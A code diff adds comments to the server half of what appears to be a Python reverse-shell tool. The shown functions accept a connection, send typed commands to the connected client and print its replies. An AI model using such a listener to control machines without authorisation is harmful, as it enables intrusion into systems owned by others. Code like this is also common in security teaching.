@@ -29,21 +29,23 @@ def bind_socket():
     except socket.error as msg:
         print("Failed in binding the port with" + str(msg) + "\n" + "Retrying...")
         bind_socket()
-
+        
+#Accepting connections
 def socket_accept():
     conn, address = s.accept()
     print("Connection has been established" + "IP: " + address[0] + " Port: " + str(address[1]))
     send_commands(conn)
     conn.close()
 
+# Send commands over the network to the client.
 def send_commands(conn):
     while True:
         cmd = input()
-        if cmd == 'quit()':
+        if cmd == 'quit()': #Exit procedure.
             conn.close()
             s.close()
             sys.exit()
-        if len(str.encode(cmd)) > 0:
+        if len(str.encode(cmd)) > 0: #Checks for input to avoid sending blanks
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024),"utf-8")
             print(client_response, end="")
